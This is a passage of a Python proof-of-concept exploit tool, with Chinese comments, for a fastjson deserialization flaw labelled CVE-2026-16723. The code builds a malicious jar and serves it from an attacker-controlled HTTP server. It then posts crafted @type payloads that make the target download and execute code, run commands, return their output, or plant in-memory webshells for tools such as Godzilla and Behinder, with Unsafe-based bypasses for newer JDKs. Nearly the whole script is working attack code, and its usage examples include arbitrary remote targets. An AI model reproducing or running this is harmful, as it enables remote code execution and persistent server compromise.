#!/usr/bin/env python3
"""CVE-2026-16723 PoC: jar:http 出网 / fd 缓存不出网 + 命令执行/回显/内存马。"""

from __future__ import annotations

import argparse
import base64
import http.server
import json
import os
import re
import secrets
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from email.message import Message
from pathlib import Path
from typing import Any

from fastjson_toolkit.poc.echo import ECHO_ENGINES as _SHARED_ECHO_ENGINES
from fastjson_toolkit.poc.memshell.auth import (
    format_memshell_connect_info,
    rand_token,
    randomize_memshell_auth,
)
from fastjson_toolkit.poc.memshell.client import (
    DEFAULT_MSHELL_BACKEND as DEFAULT_MSHELL_API,
    memshell_generate,
)
from fastjson_toolkit.poc.memshell.jdk import MSHELL_JDK_MAP, resolve_memshell_jdk


class _Ansi:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_CYAN = "\033[96m"


def _enable_windows_ansi() -> bool:
    if sys.platform != "win32":
        return True
    try:
        import ctypes

        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        mode = ctypes.c_uint32()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            return False
        ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        return bool(
            kernel32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        )
    except Exception:
        return False


_COLOR_ENABLED = (
    os.environ.get("NO_COLOR") is None
    and sys.stdout.isatty()
    and _enable_windows_ansi()
)


def _c(text: str, *codes: str) -> str:
    if not _COLOR_ENABLED or not text:
        return text
    return f"{''.join(codes)}{text}{_Ansi.RESET}"


def hl(text: str) -> str:
    """高亮关键值（密码、命中 type、端口等）。"""
    return _c(str(text), _Ansi.BOLD, _Ansi.BRIGHT_YELLOW)


def _colorize_secrets(line: str) -> str:
    """高亮 pass=/key=/header= 等连接信息。"""
    if not _COLOR_ENABLED:
        return line

    def repl(m: re.Match[str]) -> str:
        # 必须把正则吃掉的 '=' 写回去，否则会变成 passxxx / typeFilter
        return f"{m.group(1)}={hl(m.group(2))}"

    return re.sub(
        r"\b(pass|key|header|param|urlPattern|injector|shellClass|type|fd|url|tool|server)=([^\s]+)",
        repl,
        line,
        flags=re.IGNORECASE,
    )


def _colorize_message(msg: str, *, err: bool = False) -> str:
    if not _COLOR_ENABLED:
        return msg
    lines = msg.splitlines()
    out: list[str] = []
    for i, line in enumerate(lines):
        # 已含 ANSI（如 hl()/回显正文）时只给前缀上色，避免整行重绘冲掉高亮
        has_ansi = "\033[" in line
        colored = line
        if line.startswith("[+] SUCCESS"):
            colored = _c("[+] SUCCESS", _Ansi.BOLD, _Ansi.BRIGHT_GREEN) + line[
                len("[+] SUCCESS") :
            ]
        elif line.startswith("[+] HIT"):
            colored = _c("[+] HIT", _Ansi.BOLD, _Ansi.BRIGHT_GREEN) + line[len("[+] HIT") :]
        elif line.startswith("[+]"):
            body = line[3:] if has_ansi else _colorize_secrets(line[3:])
            colored = _c("[+]", _Ansi.GREEN) + body
        elif line.startswith("[!]"):
            colored = _c("[!]", _Ansi.BOLD, _Ansi.BRIGHT_RED) + (
                line[3:] if has_ansi else _c(line[3:], _Ansi.BRIGHT_RED)
            )
        elif line.startswith("[-]"):
            colored = _c("[-]", _Ansi.DIM, _Ansi.YELLOW) + _c(line[3:], _Ansi.DIM)
        elif line.startswith("[*]"):
            body = line[3:] if has_ansi else _colorize_secrets(line[3:])
            colored = _c("[*]", _Ansi.CYAN) + body
        elif err and not has_ansi:
            colored = _c(line, _Ansi.RED)
        elif not has_ansi:
            colored = _colorize_secrets(line)
        # 缩进提示行（失败说明）
        if i > 0 and line.startswith("    ") and not has_ansi:
            if "靶场" in line or "攻击者" in line or "提示" in line:
                key, _, rest = line.partition(":")
                if _:
                    colored = _c(key + ":", _Ansi.CYAN) + " " + hl(rest.strip())
                else:
                    colored = _c(line, _Ansi.YELLOW)
        out.append(colored)
    return "\n".join(out)


def log(msg: str) -> None:
    if _LOG_SINK is not None:
        _LOG_SINK.append(msg)
    print(_colorize_message(msg), flush=True)


def log_err(msg: str) -> None:
    if _LOG_SINK is not None:
        _LOG_SINK.append(msg)
    print(_colorize_message(msg, err=True), file=sys.stderr, flush=True)


def set_log_sink(sink: list[str] | None) -> None:
    """可选：把日志同时写入 list，供 API/Web 回传。"""
    global _LOG_SINK
    _LOG_SINK = sink


from fastjson_toolkit.poc.cve_2026_16723.class_name_modifier import (
    get_this_class_name,
    rewrite_class_name,
)

M2 = Path.home() / ".m2/repository"
DEFAULT_FASTJSON = Path(
    os.environ.get(
        "FASTJSON_JAR",
        str(M2 / "com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar"),
    )
)
DEFAULT_SERVLET_API = Path(
    os.environ.get(
        "SERVLET_API_JAR",
        str(M2 / "javax/servlet/javax.servlet-api/4.0.1/javax.servlet-api-4.0.1.jar"),
    )
)
DEFAULT_TARGET = os.environ.get("CVE_2026_16723_TARGET", "http://127.0.0.1:18083")
DEFAULT_DOCKER_CONTAINER = os.environ.get(
    "CVE_2026_16723_DOCKER", "cve-2026-16723-undertow"
)
DEFAULT_JSON_PATH = os.environ.get("CVE_2026_16723_JSON_PATH", "/json")
PROOF_MARKER = "CVE-2026-16723-FD-CACHE-PWNED"
_LOG_SINK: list[str] | None = None
ECHO_HEADER = "X-Echo"
ECHO_ENGINE_HEADER = "X-Echo-Engine"
ECHO_ENGINES = tuple(_SHARED_ECHO_ENGINES)
# CLI -m 短名 -> 内部模式名
EXPLOIT_MODE_MAP = {"http": "jarhttp", "fd": "fd-cache"}
HTTP_HOST_ENCODES = ("auto", "none", "decimal")
_IPV4_RE = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")

MSHELL_SERVERS = (
    "Undertow",
    "Tomcat",
    "Jetty",
    "SpringWebMvc",
    "Resin",
    "WebLogic",
    "JBoss",
    "GlassFish",
)
MSHELL_TOOLS = (
    "Command",
    "Godzilla",
    "Behinder",
    "AntSword",
    "Suo5",
    "Suo5v2",
    "NeoreGeorg",
)
HELP_EPILOG = r"""
examples:
  # 出网 + 回显（IPv4 自动转十进制，如 127.0.0.1 -> 2130706433）
  fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H 127.0.0.1 -e -c id

  # Docker 靶场（extra_hosts=attacker）
  fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -e -c id --engine undertow

  # 出网写文件
  fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -c "id>/tmp/pwn"

  # 出网注入内存马（内置 memshell-gen.jar，默认 Undertow/Command/Filter）
  fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker --memshell -c id

  # 高版本 JDK 目标（自动 byPassJavaModule）
  fjtoolkit poc-16723 -u http://1.2.3.4:8080 -H attacker \
    --memshell --ms-tool Behinder --ms-jdk 17

  # 指定中间件/马类型，并 fd 不出网注入
  fjtoolkit poc-16723 -u http://1.2.3.4:8080 -m fd -H attacker \
    --memshell --ms-server Tomcat --ms-tool Godzilla --ms-type Listener

  # 先缓存再 fd 不出网打（需 Linux /proc）
  fjtoolkit poc-16723 -u http://127.0.0.1:18083 -m fd -H attacker -e -c id

  # 复用已命中的 @type（只改命令；Windows 请用双引号）
  fjtoolkit poc-16723 -u http://127.0.0.1:18083 -e -c whoami ^
    -t "jar:file:.proc.self.fd.76!.C76xxxx"
"""


def ipv4_to_decimal(ip: str) -> str:
    """127.0.0.1 -> 2130706433（SSRF/URL 十进制绕过）。"""
    parts = ip.strip().split(".")
    if len(parts) != 4:
        raise ValueError(f"not IPv4: {ip!r}")
    nums = []
    for p in parts:
        n = int(p, 10)
        if n < 0 or n > 255:
            raise ValueError(f"invalid IPv4 octet: {ip!r}")
        nums.append(n)
    value = (nums[0] << 24) | (nums[1] << 16) | (nums[2] << 8) | nums[3]
    # force unsigned 32-bit decimal string
    return str(value & 0xFFFFFFFF)


def resolve_payload_http_host(host: str, encode: str) -> tuple[str, str]:
    """返回 (写入 payload 的 host, 说明)。

    checkAutoType 会把 typeName 里所有 '.' 换成 '/'，因此：
      - localhost / attacker 等无点名可直接用
      - 127.0.0.1 必须转成 2130706433 这类十进制形式
    """
    host = (host or "").strip()
    encode = (encode or "auto").lower()
    if not host:
        raise ValueError("http-host is empty")
    if encode not in HTTP_HOST_ENCODES:
        raise ValueError(f"unknown http-host-encode: {encode}")

    if encode == "decimal" or (encode == "auto" and _IPV4_RE.match(host)):
        if not _IPV4_RE.match(host):
            raise ValueError(f"--http-host-encode=decimal 需要 IPv4，收到: {host!r}")
        dec = ipv4_to_decimal(host)
        return dec, f"decimal {host} -> {dec}"

    # none / auto(非 IPv4)
    if "." in host:
        raise ValueError(
            f"http-host={host!r} 含 '.'，经 replace('.','/') 后会损坏。"
            f" 请改用无点主机名，或对 IPv4 使用 --http-host-encode decimal/auto。"
        )
    return host, "plain"


def make_jarhttp_type(http_host: str, http_port: int, jar_name: str, simple: str) -> str:
    """构造 jar:http 伪类名（点号伪装路径）。"""
    return f"jar:http:..{http_host}:{http_port}.{jar_name}!.{simple}"


CACHE_BAIT_SRC = """\
import com.alibaba.fastjson.annotation.JSONType;

@JSONType
public class CacheBait {
    static {
        System.out.println("[CacheBait] jar:http cache stage loaded");
    }
}
"""


def _java_string_literal(s: str) -> str:
    """生成 Java 双引号字符串字面量内容（不含外层引号）。"""
    return (
        s.replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\r", "\\r")
        .replace("\n", "\\n")
    )


def _java_string_concat(s: str, chunk: int = 4000) -> str:
    """把长字符串拆成 Java 字面量拼接，避开单段常量池限制。"""
    if not s:
        return '""'
    parts = [s[i : i + chunk] for i in range(0, len(s), chunk)]
    return " + ".join(f'"{_java_string_literal(p)}"' for p in parts)


def build_memshell_payload_src(
    proof_path: str,
    injector_b64: str,
    injector_class: str,
    meta: dict[str, Any],
) -> str:
    """生成 @JSONType wrapper：defineClass + newInstance MemShellParty injector。"""
    proof_lit = _java_string_literal(proof_path)
    inj_class_lit = _java_string_literal(injector_class)
    b64_expr = _java_string_concat(injector_b64)
    meta_lit = _java_string_literal(
        json.dumps(
            {
                "server": meta.get("server", ""),
                "tool": meta.get("tool", ""),
                "type": meta.get("shell_type", ""),
                "urlPattern": meta.get("url_pattern", ""),
                "param": meta.get("param_name", ""),
                "injector": injector_class,
            },
            separators=(",", ":"),
        )
    )
    return f"""\
import com.alibaba.fastjson.annotation.JSONType;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

@JSONType
public class WriteFileJType {{
    public WriteFileJType() {{
        try {{
            inject();
        }} catch (Throwable t) {{
            t.printStackTrace();
            try {{
                String body = "CVE-2026-16723-FD-CACHE-PWNED\\n"
                        + "ts=" + System.currentTimeMillis() + "\\n"
                        + "mode=memshell-error\\n"
                        + "err=" + String.valueOf(t) + "\\n"
                        + "meta={meta_lit}\\n";
                Files.write(Paths.get("{proof_lit}"), body.getBytes(StandardCharsets.UTF_8));
            }} catch (Throwable ignore) {{
            }}
        }}
    }}

    private static void inject() throws Exception {{
        String b64 = {b64_expr};
        byte[] bytes = Base64.getDecoder().decode(b64);
        ClassLoader parent = Thread.currentThread().getContextClassLoader();
        if (parent == null) {{
            parent = WriteFileJType.class.getClassLoader();
        }}
        ClassLoader cl = new URLClassLoader(new URL[0], parent);
        Class<?> clazz = defineClassCompat(cl, "{inj_class_lit}", bytes);
        Constructor<?> ctor = clazz.getDeclaredConstructor();
        forceAccess(ctor);
        ctor.newInstance();

        String body = "CVE-2026-16723-FD-CACHE-PWNED\\n"
                + "ts=" + System.currentTimeMillis() + "\\n"
                + "mode=memshell\\n"
                + "java=" + System.getProperty("java.version") + "\\n"
                + "loader=" + WriteFileJType.class.getClassLoader() + "\\n"
                + "name=" + WriteFileJType.class.getName() + "\\n"
                + "injector=" + clazz.getName() + "\\n"
                + "meta={meta_lit}\\n";
        try {{
            Files.write(Paths.get("{proof_lit}"), body.getBytes(StandardCharsets.UTF_8));
        }} catch (Throwable ignore) {{
        }}
        System.out.println("[WriteFileJType] memshell injector loaded: " + clazz.getName());
    }}

    /** JDK8~21: ClassLoader.defineClass 反射 / Unsafe.defineClass 多路尝试 */
    private static Class<?> defineClassCompat(ClassLoader cl, String name, byte[] bytes) throws Exception {{
        Throwable last = null;
        try {{
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass", String.class, byte[].class, int.class, int.class);
            forceAccess(defineClass);
            return (Class<?>) defineClass.invoke(
                cl, name, bytes, Integer.valueOf(0), Integer.valueOf(bytes.length));
        }} catch (Throwable e) {{
            last = e;
        }}
        // sun.misc.Unsafe.defineClass（部分 JDK8~11 仍可用）
        try {{
            Object u = unsafe("sun.misc.Unsafe");
            Method m = u.getClass().getMethod(
                "defineClass", String.class, byte[].class, int.class, int.class,
                ClassLoader.class, java.security.ProtectionDomain.class);
            return (Class<?>) m.invoke(
                u, name, bytes, Integer.valueOf(0), Integer.valueOf(bytes.length), cl, null);
        }} catch (Throwable e) {{
            last = e;
        }}
        // jdk.internal.misc.Unsafe.defineClass（JDK9+ 内部 API）
        try {{
            Object u = unsafe("jdk.internal.misc.Unsafe");
            Method m = u.getClass().getMethod(
                "defineClass", String.class, byte[].class, int.class, int.class,
                ClassLoader.class, java.security.ProtectionDomain.class);
            return (Class<?>) m.invoke(
                u, name, bytes, Integer.valueOf(0), Integer.valueOf(bytes.length), cl, null);
        }} catch (Throwable e) {{
            last = e;
        }}
        throw new IllegalStateException("defineClass failed on JDK "
            + System.getProperty("java.version"), last);
    }}

    private static Object unsafe(String clzName) throws Exception {{
        Class<?> unsafeClz = Class.forName(clzName);
        Field f = unsafeClz.getDeclaredField("theUnsafe");
        try {{
            f.setAccessible(true);
        }} catch (Throwable ignore) {{
            // 递归前先尽量直接取；override 字段本身也常需 Unsafe
            Object u0 = null;
            try {{
                Field tf = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
                tf.setAccessible(true);
                u0 = tf.get(null);
            }} catch (Throwable ignore2) {{
            }}
            if (u0 != null) {{
                Method objectFieldOffset = u0.getClass().getMethod("objectFieldOffset", Field.class);
                Method putBoolean = u0.getClass().getMethod(
                    "putBoolean", Object.class, long.class, boolean.class);
                Field override = AccessibleObject.class.getDeclaredField("override");
                long off = ((Long) objectFieldOffset.invoke(u0, override)).longValue();
                putBoolean.invoke(u0, f, Long.valueOf(off), Boolean.TRUE);
            }}
        }}
        return f.get(null);
    }}

    private static void forceAccess(AccessibleObject ao) throws Exception {{
        try {{
            ao.setAccessible(true);
            return;
        }} catch (Throwable ignore) {{
        }}
        // JDK12+: 写 AccessibleObject.override
        Object u;
        try {{
            u = unsafe("sun.misc.Unsafe");
        }} catch (Throwable e) {{
            u = unsafe("jdk.internal.misc.Unsafe");
        }}
        Class<?> uc = u.getClass();
        Method objectFieldOffset = uc.getMethod("objectFieldOffset", Field.class);
        Method putBoolean = uc.getMethod("putBoolean", Object.class, long.class, boolean.class);
        Field override = AccessibleObject.class.getDeclaredField("override");
        long off = ((Long) objectFieldOffset.invoke(u, override)).longValue();
        putBoolean.invoke(u, ao, Long.valueOf(off), Boolean.TRUE);
    }}
}}
"""


def probe_command_memshell(
    target: str,
    *,
    param_name: str,
    cmd: str,
    url_pattern: str,
    timeout: float = 8.0,
    json_path: str = DEFAULT_JSON_PATH,
) -> tuple[int, str]:
    """验证 Command 内存马：带参数访问，期望响应体为命令输出。"""
    base = target.rstrip("/")
    # /* /path/* -> 根路径；/ms -> 精确路径
    path = "/"
    up = (url_pattern or "/*").strip()
    if up and up not in ("/*", "*"):
        path = up.split("*", 1)[0] or "/"
        if not path.startswith("/"):
            path = "/" + path
        if path != "/" and path.endswith("/"):
            path = path[:-1] or "/"
    # 靶场入口在 /json，Filter(/*) 仍会命中
    if path == "/":
        path = json_path if json_path.startswith("/") else f"/{json_path}"
    qs = urllib.parse.urlencode({param_name: cmd})
    url = f"{base}{path}?{qs}"
    req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.getcode(), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except Exception as e:
        return -1, f"{type(e).__name__}: {e}"


def build_defineclass_payload_src(
    proof_path: str,
    class_b64: str,
    class_name: str,
    *,
    mode: str = "bytecode",
    meta: dict[str, Any] | None = None,
) -> str:
    """生成 @JSONType wrapper：defineClass + newInstance 任意用户/预设字节码。"""
    return build_memshell_payload_src(
        proof_path=proof_path,
        injector_b64=class_b64,
        injector_class=class_name,
        meta={
            "mode": mode,
            **(meta or {}),
        },
    ).replace("mode=memshell", f"mode={mode}").replace(
        "mode=memshell-error", f"mode={mode}-error"
    )


def build_payload_src(
    proof_path: str,
    cmd: str | None,
    echo: bool,
    cmd_header: str,
    echo_engine: str = "auto",
    memshell: dict[str, Any] | None = None,
    class_b64: str | None = None,
    class_name: str | None = None,
) -> str:
    """生成阶段二恶意类源码。

    memshell: 注入 MemShellParty injector
    class_b64: 自备/预设字节码（custom）
    echo=True : resolve echo-gen 后 JSONType defineClass 包装
    echo=False: resolve touch/exec 后包装，或兼容旧 WriteFileJType
    """
    if memshell:
        return build_memshell_payload_src(
            proof_path=proof_path,
            injector_b64=memshell["injector_b64"],
            injector_class=memshell["injector_class"],
            meta=memshell,
        )

    from fastjson_toolkit.poc.bytecode import BytecodePresetOptions, resolve_bytecode_payload

    if class_b64 and class_b64.strip():
        art = resolve_bytecode_payload(
            BytecodePresetOptions(
                preset="custom",
                class_b64=class_b64,
                class_name=class_name or "CustomPayload",
            )
        )
        if art is None:
            raise RuntimeError("custom resolve 失败")
        return build_defineclass_payload_src(
            proof_path,
            art.class_b64,
            art.class_name or "CustomPayload",
            mode="custom",
        )

    if echo:
        art = resolve_bytecode_payload(
            BytecodePresetOptions(
                preset="echo",
                engine=echo_engine or "auto",
                cmd_header=cmd_header or "X-Cmd",
                class_name="EchoPayload",
            )
        )
        if art is None:
            raise RuntimeError("echo resolve 失败")
        return build_defineclass_payload_src(
            proof_path,
            art.class_b64,
            art.class_name or "EchoPayload",
            mode="echo",
            meta={"engine": art.engine, "cmd_header": art.cmd_header},
        )

    # touch / exec 预设
    kind = "exec" if cmd else "touch"
    art = resolve_bytecode_payload(
        BytecodePresetOptions(
            preset=kind,
            cmd=cmd or "id",
            proof_path=proof_path,
            proof_content="CVE-2026-16723-FD-CACHE-PWNED",
            class_name="PresetPayload",
        )
    )
    if art is None:
        raise RuntimeError(f"{kind} resolve 失败")
    return build_defineclass_payload_src(
        proof_path,
        art.class_b64,
        art.class_name or "PresetPayload",
        mode=kind,
        meta={"cmd": cmd or ""},
    )


class CountingHandler(http.server.BaseHTTPRequestHandler):
    """统计对恶意 jar 的请求次数，用于证明阶段二不出网。"""

    jar_bytes: bytes = b""
    jar_name: str = "EvilJar"
    hits: int = 0
    lock = threading.Lock()

    def log_message(self, fmt: str, *args) -> None:
        sys.stderr.write("[http] " + (fmt % args) + "\n")

    def do_GET(self) -> None:  # noqa: N802
        path = self.path.split("?", 1)[0]
        name = self.jar_name
        ok = path in (f"/{name}", f"/{name}/", f"/{name}.jar")
        with self.lock:
            type(self).hits += 1
            hit_no = type(self).hits
        if not ok:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"not found\n")
            return
        data = self.jar_bytes
        self.send_response(200)
        self.send_header("Content-Type", "application/java-archive")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(data)
        sys.stderr.write(f"[http] served {name} (hit=#{hit_no}, {len(data)} bytes)\n")


def compile_java(src_text: str, class_name: str, out_dir: Path, classpath: str) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    src_path = out_dir / f"{class_name}.java"
    src_path.write_text(src_text, encoding="utf-8")
    cmd = [
        "javac",
        "-encoding",
        "UTF-8",
        "-source",
        "8",
        "-target",
        "8",
        "-cp",
        classpath,
        "-d",
        str(out_dir),
        str(src_path),
    ]
    proc = subprocess.run(cmd, capture_output=True)
    if proc.returncode != 0:
        err = (proc.stderr or proc.stdout or b"").decode("utf-8", errors="replace")
        raise RuntimeError(f"javac failed for {class_name}:\n{err}")
    class_path = out_dir / f"{class_name}.class"
    if not class_path.is_file():
        raise RuntimeError(f"missing compiled class: {class_path}")
    return class_path


def resolve_compile_classpath(fastjson: Path, echo: bool, servlet_api: Path) -> str:
    """echo 全反射，默认只需 fastjson；--servlet-api 仅作可选附加。"""
    jars = [fastjson]
    if echo and servlet_api is not None and servlet_api.is_file():
        # optional; not required after jEG-style reflection rewrite
        jars.append(servlet_api)
    return os.pathsep.join(str(p) for p in jars)


def _write_jar(jar_path: Path, entries: list[tuple[str, bytes]]) -> None:
    jar_path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(jar_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        manifest = (
            b"Manifest-Version: 1.0\r\n"
            b"Created-By: poc_fd_cache_writefile\r\n"
            b"\r\n"
        )
        zf.writestr("META-INF/MANIFEST.MF", manifest)
        for name, data in entries:
            zf.writestr(name, data)


def build_evil_jar(
    work: Path,
    classpath: str,
    http_host: str,
    http_port: int,
    jar_name: str,
    fd_min: int,
    fd_max: int,
    proof_path: str,
    cmd: str | None,
    echo: bool,
    cmd_header: str,
    echo_engine: str = "auto",
    nonce: str = "",
    mode: str = "fd-cache",
    memshell: dict[str, Any] | None = None,
) -> tuple[Path, str, dict[int, str]]:
    """构建恶意 jar。

    mode=fd-cache: CacheBait(jar:http 探活/缓存) + 多 fd 预设写文件/回显/内存马类
    mode=jarhttp : 仅含出网 payload 类（类名即 jar:http URL 伪名）
    """
    compile_dir = work / "classes"
    payload_src = build_payload_src(
        proof_path=proof_path,
        cmd=None if (echo or memshell) else cmd,
        echo=echo and not memshell,
        cmd_header=cmd_header,
        echo_engine=echo_engine,
        memshell=memshell,
    )
    (work / "WriteFileJType.java").write_text(payload_src, encoding="utf-8")
    write_class = compile_java(payload_src, "WriteFileJType", compile_dir, classpath)
    write_bytes = write_class.read_bytes()

    jar_path = work / jar_name
    fd_types: dict[int, str] = {}
    payload_kind = "memshell" if memshell else ("echo" if echo else "cmd")

    if mode == "jarhttp":
        # 出网：payload 类直接叫 jar:http:..host:port.jar!.PwnXxx
        simple = f"Pwn{nonce}" if nonce else "Pwn"
        http_type = make_jarhttp_type(http_host, http_port, jar_name, simple)
        http_binary = http_type.replace(".", "/")
        entry = f"{simple}.class"
        renamed = rewrite_class_name(write_bytes, http_binary)
        if get_this_class_name(renamed) != http_binary:
            raise RuntimeError("jarhttp payload class rename verify failed")
        _write_jar(jar_path, [(entry, renamed)])
        meta = {
            "mode": mode,
            "payload_kind": payload_kind,
            "http_type": http_type,
            "http_url": f"http://{http_host}:{http_port}/{jar_name}",
            "resource": http_binary + ".class",
            "jar_name": jar_name,
            "entries": 1,
            "proof_path": proof_path,
            "cmd": cmd or "",
            "echo": echo and not memshell,
            "cmd_header": cmd_header,
            "echo_engine": echo_engine,
            "nonce": nonce,
            "memshell": {
                k: memshell.get(k)
                for k in (
                    "server",
                    "tool",
                    "shell_type",
                    "url_pattern",
                    "param_name",
                    "injector_class",
                    "shell_class",
                )
            }
            if memshell
            else None,
        }
        (work / "evil-meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
        return jar_path, http_type, fd_types

    # fd-cache: 无害 CacheBait 仅用于拉 jar 进缓存
    cache_class = compile_java(CACHE_BAIT_SRC, "CacheBait", compile_dir, classpath)
    cache_bait_bytes = cache_class.read_bytes()
    bait_simple = f"CacheBait{nonce}" if nonce else "CacheBait"
    http_type = make_jarhttp_type(http_host, http_port, jar_name, bait_simple)
    http_binary = http_type.replace(".", "/")
    http_entry = f"{bait_simple}.class"
    http_class_bytes = rewrite_class_name(cache_bait_bytes, http_binary)
    if get_this_class_name(http_class_bytes) != http_binary:
        raise RuntimeError("cache-bait class rename verify failed")

    entries: list[tuple[str, bytes]] = [(http_entry, http_class_bytes)]
    for fd in range(fd_min, fd_max + 1):
        simple = f"C{fd}{nonce}" if nonce else f"C{fd}"
        type_name = f"jar:file:.proc.self.fd.{fd}!.{simple}"
        binary_name = type_name.replace(".", "/")
        entry = f"{simple}.class"
        renamed = rewrite_class_name(write_bytes, binary_name)
        if get_this_class_name(renamed) != binary_name:
            raise RuntimeError(f"fd class rename verify failed: fd={fd}")
        entries.append((entry, renamed))
        fd_types[fd] = type_name

    _write_jar(jar_path, entries)
    meta = {
        "mode": mode,
        "payload_kind": payload_kind,
        "http_type": http_type,
        "http_url": f"http://{http_host}:{http_port}/{jar_name}",
        "jar_name": jar_name,
        "fd_min": fd_min,
        "fd_max": fd_max,
        "entries": len(entries),
        "proof_path": proof_path,
        "cmd": cmd or "",
        "echo": echo and not memshell,
        "cmd_header": cmd_header,
        "echo_engine": echo_engine,
        "nonce": nonce,
        "memshell": {
            k: memshell.get(k)
            for k in (
                "server",
                "tool",
                "shell_type",
                "url_pattern",
                "param_name",
                "injector_class",
                "shell_class",
            )
        }
        if memshell
        else None,
    }
    (work / "evil-meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    return jar_path, http_type, fd_types


def ensure_port_free(host: str, port: int) -> None:
    """启动前检测监听端口是否已被占用；占用则抛 RuntimeError。"""
    if port <= 0 or port > 65535:
        raise RuntimeError(f"非法端口: {port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 不用 SO_REUSEADDR，避免误判「可复用」为「空闲」
        sock.bind((host, port))
    except OSError as e:
        raise RuntimeError(
            f"攻击者 HTTP 端口已被占用: {host}:{port} ({e}). "
            f"请结束占用进程或改用 -P 指定其它端口"
        ) from e
    finally:
        try:
            sock.close()
        except Exception:
            pass


def start_http_server(jar_path: Path, jar_name: str, host: str, port: int):
    ensure_port_free(host, port)
    CountingHandler.jar_bytes = jar_path.read_bytes()
    CountingHandler.jar_name = jar_name
    CountingHandler.hits = 0
    server = http.server.ThreadingHTTPServer((host, port), CountingHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def _headers_to_dict(headers: Message) -> dict[str, str]:
    out: dict[str, str] = {}
    for k, v in headers.items():
        out[k] = v
        out[k.lower()] = v
    return out


def _join_json_url(target: str, json_path: str = DEFAULT_JSON_PATH) -> str:
    path = json_path if json_path.startswith("/") else f"/{json_path}"
    return target.rstrip("/") + path


def post_json(
    target: str,
    payload: dict,
    timeout: float = 8.0,
    extra_headers: dict[str, str] | None = None,
    json_path: str = DEFAULT_JSON_PATH,
) -> tuple[int, str, dict[str, str]]:
    url = _join_json_url(target, json_path)
    data = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.getcode(), body, _headers_to_dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body, _headers_to_dict(e.headers)
    except Exception as e:
        return -1, f"{type(e).__name__}: {e}", {}


def decode_echo_header(resp_headers: dict[str, str]) -> str | None:
    raw = resp_headers.get(ECHO_HEADER) or resp_headers.get(ECHO_HEADER.lower())
    if not raw:
        return None
    try:
        return base64.b64decode(raw).decode("utf-8", errors="replace")
    except Exception:
        return f"<invalid base64> {raw!r}"


def docker_read_proof(container: str, proof_path: str) -> str | None:
    if not container or shutil.which("docker") is None:
        return None
    proc = subprocess.run(
        ["docker", "exec", container, "sh", "-c", f"cat {proof_path} 2>/dev/null"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if proc.returncode != 0:
        return None
    text = proc.stdout.strip()
    return text or None


def docker_rm_proof(container: str, proof_path: str) -> None:
    if not container or shutil.which("docker") is None:
        return
    subprocess.run(
        ["docker", "exec", container, "rm", "-f", proof_path],
        capture_output=True,
        text=True,
        timeout=10,
    )


def docker_list_jar_fd_info(container: str) -> list[tuple[int, str]]:
    """返回 [(fd, ls行), ...]，优先 jar_cache。"""
    if not container or shutil.which("docker") is None:
        return []
    proc = subprocess.run(
        [
            "docker",
            "exec",
            container,
            "sh",
            "-c",
            "ls -l /proc/1/fd 2>/dev/null | grep -E 'jar_cache|\\.tmp' || true",
        ],
        capture_output=True,
        text=True,
        timeout=10,
    )
    out: list[tuple[int, str]] = []
    for ln in proc.stdout.splitlines():
        ln = ln.strip()
        if not ln:
            continue
        m = re.search(r"\s(\d+)\s+->\s+", ln)
        if not m:
            m = re.match(r"(\d+)\s+->\s+", ln)
        if not m:
            parts = ln.split()
            if len(parts) >= 3 and parts[1] == "->":
                try:
                    out.append((int(parts[0]), ln))
                except ValueError:
                    pass
            continue
        try:
            out.append((int(m.group(1)), ln))
        except ValueError:
            continue
    return out


def order_fd_candidates(
    fd_types: dict[int, str],
    preferred: list[int],
    fd_min: int,
    fd_max: int,
) -> list[int]:
    seen: set[int] = set()
    ordered: list[int] = []
    for fd in preferred:
